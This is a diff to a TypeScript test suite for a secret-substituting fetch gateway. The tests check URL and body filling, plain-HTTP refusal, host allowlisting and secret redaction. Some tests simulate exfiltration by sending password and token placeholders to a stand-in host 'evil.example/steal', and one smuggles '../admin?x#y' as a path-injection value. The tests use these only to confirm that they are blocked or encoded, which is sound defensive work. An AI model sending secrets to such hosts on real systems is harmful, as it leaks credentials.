@@ -1,6 +1,6 @@
 import { ownerIdFromStored } from '@kody-internal/shared/owner-person-ids.ts'
 import { getErrorMessage } from '@kody-internal/shared/error-message.ts'
-import { beforeEach, expect, test, vi } from 'vitest'
+import { expect, test, vi } from 'vitest'
 import { sessionRequestContext } from '#worker/test-support/request-context.ts'
 import { McpCallerError } from '#mcp/caller-error.ts'
 import {
@@ -30,6 +30,7 @@ import * as integrationPackageAccess from '#worker/integrations/package-access.t
 import * as integrationService from '#worker/integrations/service.ts'
 import * as providerService from '#mcp/secrets/secret-providers/service.ts'
 import * as usageModule from '#worker/usage/record-usage.ts'
+import { IntegrationHostNotAllowedError } from '#mcp/execute-modules/integration-host-allowlist.ts'
 
 const userMeter = createInMemoryUserMeterEnv()
 const env = {
@@ -184,14 +185,6 @@ const isPackageAccessRequiredFor = (packageName: string) => (error: unknown) =>
 	parsePackageAccessRequiredMessage(getErrorMessage(error))?.packageName ===
 	packageName
 
-// Declared-slot placement is covered in fetch-gateway-credential-use; these
-// packages declare no kody.credentials.
-beforeEach(() => {
-	vi.spyOn(secretPlacement, 'loadSecretPlacementPolicy').mockResolvedValue({
-		kind: 'undeclared',
-	})
-})
-
 test('fetch gateway blocks or expands secret placeholders based on host approval', async () => {
 	const createRequest = () =>
 		new Request('https://example.com/api', {
@@ -225,103 +218,193 @@ test('fetch gateway blocks or expands secret placeholders based on host approval
 	expect(await transformed.text()).toBe(JSON.stringify({ query: 'me' }))
 })
 
-test('fetch gateway refuses placeholders in the URL path or query before resolving', async () => {
+test('fetch gateway fills placeholders in the URL path and query on an allowed host', async () => {
 	const resolveSpy = vi
 		.spyOn(secretService, 'resolveSecret')
-		.mockResolvedValue(userSecret('secret-value', ['api.example.com']))
-	const urlRule =
-		/is in the request URL\. The fetch gateway substitutes a secret only into a request header, never the URL, query, or body\./
+		.mockImplementation(async ({ name }) =>
+			userSecret(`${name}-value`, ['api.telegram.org', 'api.example.com']),
+		)
 
 	// Request serialization percent-encodes `{` / `}` in the path.
 	const pathRequest = new Request(
 		'https://api.telegram.org/bot{{secret:telegramBotToken|scope=user}}/getMe',
 	)
 	expect(pathRequest.url).toContain('%7B%7Bsecret:telegramBotToken')
-	await expect(expand(pathRequest)).rejects.toThrow(
-		/^Secret "telegramBotToken" is in the request URL\./,
+	expect((await expand(pathRequest)).url).toBe(
+		'https://api.telegram.org/bottelegramBotToken-value/getMe',
 	)
-	await expect(
-		expand(
-			new Request(
-				'https://api.example.com/search?key={{secret:queryToken|scope=user}}',
-				{ headers: { Authorization: 'Bearer {{secret:okToken}}' } },
-			),
+
+	const literalQuery = await expand(
+		new Request(
+			'https://api.example.com/search?q=cats&key={{secret:queryToken|scope=user}}',
 		),
-	).rejects.toThrow(urlRule)
-	await expect(
-		expand(createPathOnlyRequest('/api?key={{integration-token:google}}')),
-	).rejects.toThrow(/^Integration token "google" is in the request URL\./)
-	expect(resolveSpy).not.toHaveBeenCalled()
+	)
+	expect(new URL(literalQuery.url).searchParams.get('key')).toBe(
+		'queryToken-value',
+	)
+	expect(new URL(literalQuery.url).searchParams.get('q')).toBe('cats')
+
+	const builtUrl = new URL('https://api.example.com/v1')
+	builtUrl.search = new URLSearchParams({
+		key: '{{secret:queryToken}}',
+	}).toString()
+	expect(builtUrl.href).toContain('%7B%7Bsecret%3AqueryToken%7D%7D')
+	const built = await expand(new Request(builtUrl))
+	expect(new URL(built.url).searchParams.get('key')).toBe('queryToken-value')
+
+	// A URL without a placeholder is left exactly as written.
+	const plainUrl = 'https://api.example.com/a%20b?x=%7Bliteral%7D&y=1+2'
+	expect((await expand(new Request(plainUrl))).url).toBe(plainUrl)
+	expect(resolveSpy).toHaveBeenCalledTimes(3)
 })
 
-test('fetch gateway refuses a body that holds a placeholder instead of sending it unsubstituted', async () => {
-	const resolveSpy = vi
-		.spyOn(secretService, 'resolveSecret')
-		.mockResolvedValue(userSecret('secret-value', ['api.example.com']))
-	const credentialSpy = vi.spyOn(credentialResolution, 'resolveCredential')
-	const bodies = [
-		{
-			contentType: 'application/json',
-			body: JSON.stringify({ userId: '{{secret:clerkReviewUserId}}' }),
-			refusal: /^Secret "clerkReviewUserId" is in the request body\./,
-			slot: 'clerkReviewUserId',
-		},
-		{
-			contentType: 'application/x-www-form-urlencoded',
-			body: new URLSearchParams({
-				grant_type: 'refresh_token',
-				refresh_token: '{{secret:githubToken|scope=user}}',
-			}).toString(),
-			refusal: /^Secret "githubToken" is in the request body\./,
-			slot: 'githubToken',
-		},
-		{
-			contentType: 'text/plain',
-			body: '{{secret-basic:username=githubUser,password=githubToken}}',
-			refusal:
-				/^Basic auth secret pair "githubUser" \/ "githubToken" is in the request body\./,
-			slot: null,
-		},
-		{
-			contentType: 'text/plain',
-			body: 'token={{integration-token:github}}',
-			refusal: /^Integration token "github" is in the request body\./,
-			slot: 'github',
-		},
-		{
-			contentType: 'text/plain',
-			body: '{{secret/onepassword:op://vault/item/field}}',
-			refusal: /^Vault secret from "onepassword" is in the request body\./,
-			slot: null,
-		},
-	]
-	for (const { contentType, body, refusal, slot } of bodies) {
-		const request = () =>
-			new Request('https://api.example.com/v1/reviews', {
+test('fetch gateway URL fill keeps routing and unrelated query bytes as written', async () => {
+	vi.spyOn(secretService, 'resolveSecret').mockImplementation(
+		async ({ name }) =>
+			userSecret(name === 'routey' ? '../admin?x#y' : `${name}-value`, [
+				'api.example.com',
+			]),
+	)
+
+	const encodedPath = await expand(
+		new Request(
+			`https://api.example.com/v1/${encodeURIComponent('{{secret:pathToken|scope=user}}')}/me`,
+		),
+	)
+	expect(encodedPath.url).toBe('https://api.example.com/v1/pathToken-value/me')
+
+	const routey = await expand(
+		new Request('https://api.example.com/v1/users/{{secret:routey}}/me'),
+	)
+	expect(routey.url).toBe(
+		'https://api.example.com/v1/users/..%2Fadmin%3Fx%23y/me',
+	)
+
+	const signed = await expand(
+		new Request(
+			'https://api.example.com/v1?sig=a%20b&list=x+y&token={{secret:queryToken}}',
+		),
+	)
+	expect(signed.url).toBe(
+		'https://api.example.com/v1?sig=a%20b&list=x+y&token=queryToken-value',
+	)
+})
+
+test('fetch gateway keeps byte bodies as bytes, adding no Content-Type', async () => {
+	vi.spyOn(secretService, 'resolveSecret').mockResolvedValue(
+		userSecret('secret-value', ['api.example.com']),
+	)
+	const encoder = new TextEncoder()
+	const headerOnly = await expand(
+		new Request('https://api.example.com/upload', {
+			method: 'PUT',
+			headers: { Authorization: 'Bearer {{secret:token}}' },
+			body: encoder.encode('abc'),
+		}),
+	)
+	expect(headerOnly.headers.get('content-type')).toBeNull()
+	expect(await headerOnly.text()).toBe('abc')
+
+	const filled = await expand(
+		new Request('https://api.example.com/upload', {
+			method: 'PUT',
+			body: encoder.encode('token={{secret:token}}'),
+		}),
+	)
+	expect(filled.headers.get('content-type')).toBeNull()
+	expect(await filled.text()).toBe('token=secret-value')
+})
+
+test('fetch gateway fills placeholders in JSON, form, and text bodies on an allowed host', async () => {
+	vi.spyOn(secretService, 'resolveSecret').mockImplementation(
+		async ({ name }) =>
+			userSecret(name === 'quoted' ? 'pa"ss\\word' : `${name}-value`, [
+				'api.example.com',
+			]),
+	)
+	const send = (contentType: string, body: string) =>
+		expand(
+			new Request('https://api.example.com/v1/session', {
 				method: 'POST',
-				headers: {
-					Authorization: 'Bearer {{secret:githubToken|scope=user}}',
-					'Content-Type': contentType,
-				},
+				headers: { 'Content-Type': contentType },
 				body,
-			})
-		await expect(expand(request())).rejects.toThrow(refusal)
-		await expect(expand(request())).rejects.toThrow(
-			/never substitutes a secret into a request body, and it will not send an unsubstituted placeholder upstream\..*x-kody-secret-resolution: headers-only/,
-		)
-		await expect(expand(request())).rejects.toBeInstanceOf(
-			secretPlacement.SecretPlacementError,
-		)
-		await expect(expand(request())).rejects.toMatchObject({
-			code: 'credential_placement_refused',
-			slot,
-		})
-	}
-	expect(credentialSpy).not.toHaveBeenCalled()
-	expect(resolveSpy).not.toHaveBeenCalled()
+			}),
+		).then((request) => request.text())
+
+	const json = await send(
+		'application/json',
+		JSON.stringify({
+			identifier: '{{secret:handle}}',
+			password: '{{secret:quoted|scope=user}}',
+		}),
+	)
+	expect(JSON.parse(json)).toEqual({
+		identifier: 'handle-value',
+		password: 'pa"ss\\word',
+	})
+
+	const form = await send(
+		'application/x-www-form-urlencoded',
+		new URLSearchParams({
+			grant_type: 'refresh_token',
+			refresh_token: '{{secret:refreshToken|scope=user}}',
+			password: '{{secret:quoted}}',
+		}).toString(),
+	)
+	expect(Object.fromEntries(new URLSearchParams(form))).toEqual({
+		grant_type: 'refresh_token',
+		refresh_token: 'refreshToken-value',
+		password: 'pa"ss\\word',
+	})
+
+	expect(await send('text/plain', 'token={{secret:plain}};')).toBe(
+		'token=plain-value;',
+	)
+
+	// JSON.stringify bodies sent without a Content-Type arrive as text/plain.
+	const untypedJson = await send(
+		'text/plain;charset=UTF-8',
+		JSON.stringify({ password: '{{secret:quoted}}' }),
+	)
+	expect(JSON.parse(untypedJson)).toEqual({ password: 'pa"ss\\word' })
+
+	const sized = await expand(
+		new Request('https://api.example.com/v1/session', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json', 'Content-Length': '30' },
+			body: '{"identifier":"{{secret:h}}"}',
+		}),
+	)
+	expect(sized.headers.get('content-length')).toBeNull()
+	expect(await sized.text()).toBe('{"identifier":"h-value"}')
+
+	// A body without a placeholder is forwarded byte for byte.
+	const untouched = '{"a": 1,   "b": "{literal}"}'
+	expect(await send('application/json', untouched)).toBe(untouched)
 })
 
-test('fetch gateway sends a body that quotes placeholder syntax verbatim when the caller opts in with headers-only', async () => {
+test('fetch gateway fills integration tokens in the body against the integration hosts', async () => {
+	vi.spyOn(credentialResolution, 'resolveCredential').mockImplementation(
+		async ({ credential }) => {
+			expect(credential).toMatchObject({
+				use: 'integration-token',
+				name: 'github',
+				requestHost: 'api.github.com',
+			})
+			return 'gho_value'
+		},
+	)
+	const sent = await expand(
+		new Request('https://api.github.com/graphql', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({ token: '{{integration-token:github}}' }),
+		}),
+	)
+	expect(JSON.parse(await sent.text())).toEqual({ token: 'gho_value' })
+})
+
+test('fetch gateway headers-only fills headers and sends a body that quotes placeholder syntax verbatim', async () => {
 	const resolveSpy = vi
 		.spyOn(secretService, 'resolveSecret')
 		.mockResolvedValue(userSecret('secret-value', ['api.example.com']))
@@ -330,42 +413,135 @@ test('fetch gateway sends a body that quotes placeholder syntax verbatim when th
 		body: 'Use {{secret:githubToken|scope=user}} or {{secret:githubToken}} in a header.',
 	})
 	const sent = await expand(
-		new Request('https://api.example.com/repos/o/r/issues', {
-			method: 'POST',
-			headers: {
-				Authorization: 'Bearer {{secret:githubToken|scope=user}}',
-				'Content-Type': 'application/json',
-				[secretResolutionHeaderName]: 'headers-only',
+		new Request(
+			'https://api.example.com/repos/o/r/issues?q={{secret:githubToken}}',
+			{
+				method: 'POST',
+				headers: {
+					Authorization: 'Bearer {{secret:githubToken|scope=user}}',
+					'Content-Type': 'application/json',
+					[secretResolutionHeaderName]: 'headers-only',
+				},
+				body: issueBody,
 			},
-			body: issueBody,
-		}),
+		),
 	)
 	expect(sent.headers.get('Authorization')).toBe('Bearer secret-value')
 	expect(sent.headers.get(secretResolutionHeaderName)).toBeNull()
+	expect(new URL(sent.url).searchParams.get('q')).toBe('{{secret:githubToken}}')
 	const sentBody = await sent.text()
 	expect(sentBody).toBe(issueBody)
 	expect(sentBody).not.toContain('secret-value')
 	expect(resolveSpy).toHaveBeenCalledTimes(1)
-
-	// headers-only never opens the URL: a URL placeholder is still refused.
-	await expect(
-		expand(
-			new Request('https://api.example.com/v1?key={{secret:githubToken}}', {
-				headers: { [secretResolutionHeaderName]: 'headers-only' },
-			}),
-		),
-	).rejects.toThrow(/^Secret "githubToken" is in the request URL\./)
 })
 
-test('fetch gateway refuses a form-encoded placeholder in the URL query', async () => {
-	const resolveSpy = vi.spyOn(secretService, 'resolveSecret')
-	const url = new URL('https://api.example.com/v1')
-	url.search = new URLSearchParams({ key: '{{secret:queryToken}}' }).toString()
-	expect(url.href).toContain('%7B%7Bsecret%3AqueryToken%7D%7D')
-	await expect(expand(new Request(url))).rejects.toThrow(
-		/^Secret "queryToken" is in the request URL\./,
+test('fetch gateway refuses a placeholder over plain HTTP, naming the slot and host, before resolving', async () => {
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue(userSecret('secret-value', ['api.example.com']))
+	const credentialSpy = vi.spyOn(credentialResolution, 'resolveCredential')
+	const requests = [
+		() =>
+			new Request('http://api.example.com/v1', {
+				headers: { Authorization: 'Bearer {{secret:apiToken}}' },
+			}),
+		() => new Request('http://api.example.com/v1?key={{secret:apiToken}}'),
+		() =>
+			new Request('http://api.example.com/v1', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({ token: '{{secret:apiToken}}' }),
+			}),
+	]
+	for (const request of requests) {
+		await expect(expand(request())).rejects.toBeInstanceOf(
+			secretPlacement.SecretPlacementError,
+		)
+		await expect(expand(request())).rejects.toThrow(
+			/^Secret "apiToken" cannot be sent to host "api\.example\.com" over plain HTTP\. The fetch gateway fills secrets only over HTTPS\./,
+		)
+		await expect(expand(request())).rejects.toMatchObject({
+			code: 'credential_placement_refused',
+			slot: 'apiToken',
+			message: expect.stringMatching(
+				/\(credential_placement_refused, slot "apiToken"\)$/,
+			),
+		})
+	}
+	await expect(
+		expand(
+			new Request('http://api.example.com/v1', {
+				method: 'POST',
+				body: '{{integration-token:github}}',
+			}),
+		),
+	).rejects.toThrow(
+		/^Integration token "github" cannot be sent to host "api\.example\.com" over plain HTTP\./,
+	)
+	// Plain HTTP without a placeholder is just a fetch.
+	expect((await expand(new Request('http://api.example.com/v1'))).url).toBe(
+		'http://api.example.com/v1',
 	)
 	expect(resolveSpy).not.toHaveBeenCalled()
+	expect(credentialSpy).not.toHaveBeenCalled()
+})
+
+test('fetch gateway refuses a placeholder in the URL host or user info', async () => {
+	const resolveSpy = vi.spyOn(secretService, 'resolveSecret')
+	await expect(
+		expand(
+			createPathOnlyRequest('https://{{secret:user}}:pw@api.example.com/v1'),
+		),
+	).rejects.toThrow(
+		/^Secret "user" is in the host or user info of the request URL\./,
+	)
+	expect(resolveSpy).not.toHaveBeenCalled()
+})
+
+test('fetch gateway refuses a body placeholder on a host the secret does not allow, naming the slot and host', async () => {
+	vi.spyOn(secretService, 'resolveSecret').mockResolvedValue(
+		userSecret('secret-value', ['bsky.social']),
+	)
+	const refused = expand(
+		new Request('https://evil.example/xrpc/session', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({ password: '{{secret:appPassword}}' }),
+		}),
+	)
+	const error = await refused.catch((caught: unknown) => caught)
+	expect(error).toBeInstanceOf(secretPlacement.SecretPlacementError)
+	expect(error).toMatchObject({
+		code: 'credential_placement_refused',
+		slot: 'appPassword',
+	})
+	expect(parseHostApprovalRequiredBatchMessage(getErrorMessage(error))).toEqual(
+		{
+			entries: [
+				expect.objectContaining({
+					secretName: 'appPassword',
+					host: 'evil.example',
+				}),
+			],
+			bulkApprovalUrl: null,
+		},
+	)
+
+	vi.spyOn(credentialResolution, 'resolveCredential').mockRejectedValueOnce(
+		new IntegrationHostNotAllowedError('github', 'evil.example'),
+	)
+	await expect(
+		expand(
+			new Request('https://evil.example/v1', {
+				method: 'POST',
+				body: 'token={{integration-token:github}}',
+			}),
+		),
+	).rejects.toMatchObject({
+		code: 'credential_placement_refused',
+		slot: 'github',
+		message: expect.stringContaining('evil.example'),
+	})
 })
 
 test('fetch gateway bulk host approval uses the secret scope, not the package runtime context', async () => {
@@ -554,7 +730,7 @@ test('fetch gateway gates integration tokens by the connection grant and require
 		expect.objectContaining({ name: 'google', packageId: 'pkg-1' }),
 	)
 
-	// A host outside requiredHosts is refused.
+	// A host outside requiredHosts is refused before the token resolves.
 	joinedSpy.mockResolvedValue({
 		lane: 'user',
 		app: { apiBaseUrl: 'https://www.googleapis.com' },
@@ -566,7 +742,7 @@ test('fetch gateway gates integration tokens by the connection grant and require
 		expand(integrationRequest('https://evil.example/steal')),
 	).rejects.toThrow('does not allow requests to host "evil.example"')
 
-	// A resolved token without a joined connection is refused.
+	// A token without a joined connection is refused.
 	joinedSpy.mockResolvedValue(null)
 	await expect(
 		expand(integrationRequest('https://evil.example/steal')),
@@ -578,7 +754,7 @@ test('fetch gateway gates integration tokens by the connection grant and require
 			name: 'google',
 		}),
 	)
-	expect(tokenSpy).toHaveBeenCalledTimes(4)
+	expect(tokenSpy).toHaveBeenCalledTimes(2)
 })
 
 test('opt-out header controls secret resolution and strips itself from forwarded requests', async () => {
@@ -679,9 +855,8 @@ test('fetch gateway preserves request bodies and honors opt-out for text and bin
 		multipartBody,
 	)
 
-	// Text multipart parts that quote placeholders are refused by default and
-	// forwarded unchanged with headers-only; only the header placeholder
-	// resolves.
+	// Multipart bodies are opaque: text parts that quote placeholders are
+	// forwarded unchanged and only the header placeholder resolves.
 	const textBoundary = '----KodyDiscordBoundaryTest'
 	const payloadJson = JSON.stringify({
 		content: 'Feedback mentioned {{secret:BraveSearch}} in the docs.',
@@ -717,14 +892,8 @@ test('fetch gateway preserves request bodies and honors opt-out for text and bin
 					allowedPackages: [],
 				},
 	)
-	await expect(
-		expand(discordMultipart(textBoundary, textMultipartBody)),
-	).rejects.toThrow(/^Secret "BraveSearch" is in the request body\./)
-	expect(resolveSpy).not.toHaveBeenCalled()
 	const transformedTextMultipart = await expand(
-		discordMultipart(textBoundary, textMultipartBody, {
-			[secretResolutionHeaderName]: 'headers-only',
-		}),
+		discordMultipart(textBoundary, textMultipartBody),
 	)
 	expect(transformedTextMultipart.headers.get('Authorization')).toBe(
 		'Bot secret-value',
@@ -737,8 +906,8 @@ test('fetch gateway preserves request bodies and honors opt-out for text and bin
 		expect.objectContaining({ name: 'discordBotToken' }),
 	)
 
-	// BOM-prefixed JSON and opt-out bodies pass through byte-for-byte without
-	// resolution. Placeholder bytes inside a binary body are still refused.
+	// BOM-prefixed JSON, binary, and opt-out bodies pass through byte-for-byte
+	// without resolution.
 	resolveSpy.mockClear()
 	resolveSpy.mockResolvedValue(
 		userSecret('secret-value', ['discord.com', 'example.com']),
@@ -761,14 +930,14 @@ test('fetch gateway preserves request bodies and honors opt-out for text and bin
 		encoder.encode('{{secret:name|scope=user}}'),
 		new Uint8Array([0xfe]),
 	)
-	await expect(
-		bodyBytes(
+	expect(
+		await bodyBytes(
 			new Request('https://example.com/upload', {
 				method: 'PUT',
 				body: binaryPlaceholderBody,
 			}),
 		),
-	).rejects.toThrow(/^Secret "name" is in the request body\./)
+	).toEqual(binaryPlaceholderBody)
 	expect(
 		await bodyBytes(
 			new Request('https://example.com/upload', {
@@ -1024,15 +1193,21 @@ test('gateway fetch records outbound_fetch usage metering', async () => {
 		entityId: 'example.com',
 		outcome: 'success',
 	})
-	// A URL placeholder is refused before anything leaves the gateway.
-	await expect(
-		gatewayFetch('/bot%7B%7Bsecret:token%7D%7D/getMe'),
-	).rejects.toThrow('is in the request URL')
-	expect(fetchStub).not.toHaveBeenCalled()
-	expect((await takeUsage())?.[1]).toMatchObject({
-		entityId: '',
-		outcome: 'error',
+	// A filled URL path meters only the host, never the secret.
+	fetchStub.mockClear()
+	vi.spyOn(secretService, 'resolveSecret').mockResolvedValue(
+		userSecret('tok_path_value', ['example.com']),
+	)
+	await gatewayFetch('/bot%7B%7Bsecret:token%7D%7D/getMe')
+	expect(fetchStub.mock.calls[0]?.[0]?.url).toBe(
+		'https://example.com/bottok_path_value/getMe',
+	)
+	const pathUsage = (await takeUsage())?.[1]
+	expect(pathUsage).toMatchObject({
+		entityId: 'example.com',
+		outcome: 'success',
 	})
+	expect(JSON.stringify(pathUsage)).not.toContain('tok_path_value')
 })
 
 test('leak: a substituted secret the remote echoes back is redacted before the caller sees it', async () => {
@@ -1111,6 +1286,88 @@ test('leak: a substituted secret the remote echoes back is redacted before the c
 		globalFetch: (async () => plainResponse) as unknown as typeof fetch,
 	})
 	expect(await plain.text()).toBe('sk_live_echo_123456')
+})
+
+test('leak: a secret filled into the body or URL is redacted from echoes in every encoding and from fetch errors', async () => {
+	vi.spyOn(usageModule, 'recordUsage').mockResolvedValue(undefined)
+	const secret = 'app pass/"word"&1'
+	vi.spyOn(secretService, 'resolveSecret').mockResolvedValue(
+		userSecret(secret, ['api.example.com']),
+	)
+	const sentBodies: Array<string> = []
+	const echoFetch = vi.fn(async (request: Request) => {
+		const body = await request.text()
+		sentBodies.push(body)
+		return new Response(`url=${request.url}\nbody=${body}`, {
+			headers: { 'x-echo-url': request.url, 'x-echo-body': body },
+		})
+	})
+	const send = (request: Request) =>
+		executeGatewayFetch({
+			env,
+			props,
+			request,
+			globalFetch: echoFetch as unknown as typeof fetch,
+		})
+
+	const json = await send(
+		new Request('https://api.example.com/session', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({ password: '{{secret:appPassword}}' }),
+		}),
+	)
+	expect(JSON.parse(sentBodies[0]!)).toEqual({ password: secret })
+	expect(json.headers.get('x-echo-body')).toBe(
+		'{"password":"[REDACTED SECRET]"}',
+	)
+	expect(await json.text()).toBe(
+		'url=https://api.example.com/session\nbody={"password":"[REDACTED SECRET]"}',
+	)
+
+	const form = await send(
+		new Request('https://api.example.com/token', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+			body: 'password={{secret:appPassword}}',
+		}),
+	)
+	const formEcho = await form.text()
+	expect(formEcho).toBe(
+		'url=https://api.example.com/token\nbody=password=[REDACTED SECRET]',
+	)
+
+	const query = await send(
+		new Request('https://api.example.com/q?key={{secret:appPassword}}'),
+	)
+	expect(query.headers.get('x-echo-url')).toBe(
+		'https://api.example.com/q?key=[REDACTED SECRET]',
+	)
+	expect(await query.text()).not.toContain('app')
+
+	const path = await send(
+		new Request('https://api.example.com/v1/{{secret:appPassword}}/me'),
+	)
+	expect(path.headers.get('x-echo-url')).toBe(
+		'https://api.example.com/v1/[REDACTED SECRET]/me',
+	)
+
+	const failing = executeGatewayFetch({
+		env,
+		props,
+		request: new Request(
+			'https://api.example.com/q?key={{secret:appPassword}}',
+		),
+		globalFetch: (async (request: Request) => {
+			throw new TypeError(`fetch failed for ${request.url}`)
+		}) as unknown as typeof fetch,
+	})
+	const error = await failing.catch((caught: unknown) => caught)
+	expect(error).toBeInstanceOf(Error)
+	expect((error as Error).name).toBe('TypeError')
+	expect((error as Error).message).toBe(
+		'fetch failed for https://api.example.com/q?key=[REDACTED SECRET]',
+	)
 })
 
 test('fetch gateway aborts hung outbound fetches via timeoutMs or outboundFetchTimeoutMs props', async () => {
@@ -1391,6 +1648,11 @@ test('fetch gateway provider placeholders: normalize mixed case, deny wrong host
 	expect(resolveSpy).toHaveBeenCalledWith(
 		expect.objectContaining({ request: props.request }),
 	)
+	// A vault ref holds `/`, and it still fills as a single path span.
+	const inPath = await expand(
+		new Request(`https://app.example.com/v1/${canonical}/me`),
+	)
+	expect(inPath.url).toBe('https://app.example.com/v1/vault-password/me')
 
 	await expect(
 		expand(providerRequest('https://evil.example.com/login', canonical)),
